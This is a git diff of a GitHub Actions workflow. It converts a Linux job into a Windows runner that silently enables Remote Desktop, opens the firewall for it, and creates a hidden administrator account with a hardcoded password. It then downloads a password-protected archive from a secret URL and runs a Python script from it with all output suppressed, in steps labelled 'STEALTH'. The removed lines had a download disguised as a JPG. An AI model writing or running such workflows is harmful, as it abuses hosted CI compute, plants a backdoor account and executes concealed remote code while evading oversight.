@@ -1,4 +1,4 @@
-name: Linux Worker
+name: Windows Worker with RDP Localhost (No Tunnel)
 
 on:
   workflow_dispatch:
@@ -11,37 +11,60 @@ concurrency:
 
 jobs:
   worker:
-    runs-on: ubuntu-latest
+    runs-on: windows-latest
     timeout-minutes: 90
 
     steps:
-      - uses: actions/checkout@v3
-
-      - name: Setup Python
-        uses: actions/setup-python@v5
-        with:
-          python-version: "3.10"
-
-      - name: Prepare dependencies (silent)
+      - name: Enable RDP (Silent)
+        shell: powershell
         run: |
-          sudo apt-get update -y > /dev/null 2>&1
-          sudo apt-get install -y p7zip-full > /dev/null 2>&1
+          $ErrorActionPreference = 'SilentlyContinue'
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 > $null 2>&1
+          Enable-NetFirewallRule -DisplayGroup "Remote Desktop" > $null 2>&1
 
-      - name: Download model (jpg disguised)
+      - name: Set Simple RDP Credentials (Silent)
+        shell: powershell
+        run: |
+          $ErrorActionPreference = 'SilentlyContinue'
+          $user = "V"
+          $password = "Root123"
+          
+          $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
+          
+          if (-not (Get-LocalUser -Name $user -ErrorAction SilentlyContinue)) {
+              New-LocalUser -Name $user -Password $securePassword > $null 2>&1
+          } else {
+              Set-LocalUser -Name $user -Password $securePassword > $null 2>&1
+          }
+          
+          Add-LocalGroupMember -Group "Administrators" -Member $user -ErrorAction SilentlyContinue > $null 2>&1
+
+      - name: Download package (silent)
+        shell: powershell
         env:
-          MODEL_URL: ${{ secrets.LINK }}
+          SRC_URL: ${{ secrets.LINK }}
         run: |
-          curl -L "$MODEL_URL" -o model.jpg > /dev/null 2>&1
+          $ProgressPreference = 'SilentlyContinue'
+          Invoke-WebRequest -Uri "$Env:SRC_URL" -OutFile "app.7z" > $null 2>&1
 
-      - name: Rename & extract model
+      - name: Extract package (silent)
+        shell: powershell
         env:
-          ARCHIVE_KEY: ${{ secrets.PASSWORD }}
+          ARCHIVE_KEY: ${{ secrets.PSWD }}
         run: |
-          mv model.jpg model.7z
-          7z x model.7z -p"$ARCHIVE_KEY" -oextracted -y > /dev/null 2>&1
+          & "C:\Program Files\7-Zip\7z.exe" x app.7z -p"$Env:ARCHIVE_KEY" -oextracted -y > $null 2>&1
 
-      - name: Run CR_Proxy.py (STEALTH)
+      - name: Run worker (STEALTH)
+        shell: powershell
         run: |
-          main=$(find extracted -type f -name "CR_Proxy.py" | head -n 1)
-          if [ -z "$main" ]; then exit 0; fi
-          python "$main" > /dev/null 2>&1
+          $ErrorActionPreference = 'SilentlyContinue'
+          $env:NODE_NO_WARNINGS = "1"
+
+          $file = Get-ChildItem extracted -Recurse -Filter *.py -ErrorAction SilentlyContinue | Select-Object -First 1
+          if ($file) {
+              cmd /c "python `"$($file.FullName)`" > nul 2>&1"
+          }
+
+      - name: Keep Runner Alive
+        shell: powershell
+        run: Start-Sleep -Seconds 21600  # 6 jam max
